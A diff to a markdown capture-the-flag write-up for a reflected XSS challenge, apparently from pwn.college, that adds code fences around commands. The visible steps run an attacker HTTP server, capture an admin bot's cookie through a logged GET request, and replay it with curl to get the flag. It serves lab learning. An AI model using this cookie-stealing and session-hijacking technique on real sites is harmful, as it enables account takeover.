@@ -22,8 +22,9 @@ Start the vulnerable server:
 ```
 
 Start the attacker's HTTP server:
+```bash
 python3 -m http.server 1337 > server.log 2>&1 &
-
+```
 ### 2. Craft the Payload (index.html)
 
 Create index.html in the directory served by the attacker's server. The script dynamically builds an XSS payload, encodes it, and redirects the bot to the vulnerable endpoint.
@@ -55,9 +56,9 @@ Submit the URL http://hacker.localhost:1337 to the admin bot (via the challenge 
 ### 4. Capture the Cookie
 
 The bot visits the page, gets redirected to the vulnerable endpoint, and the reflected XSS executes. The bot's cookie is sent to the attacker's server via a GET request. Check server.log:
-
+```bash
 cat server.log
-
+```
 
 You will see a line like:
 127.0.0.1 - - [29/Oct/2026 08:42:05] "GET /?c=YXV0aD1hZG1pbnwuUVg1a3pNend5TXdFRE4yRXpXfQ== HTTP/1.1" 200 -
@@ -76,9 +77,9 @@ auth=admin|.QX5kzMzwyMwEDN2EzW}
 ### 6. Log In as Admin and Get the Flag
 
 Use the stolen cookie to access the main page and extract the flag:
-
+```bash
 curl -L -b "auth=admin|.QX5kzMzwyMwEDN2EzW}" http://challenge.localhost/ | grep -o "pwn.college{[^}]*}"
-
+```
 ## Root Cause
 
 The vulnerability is a combination of three flaws:
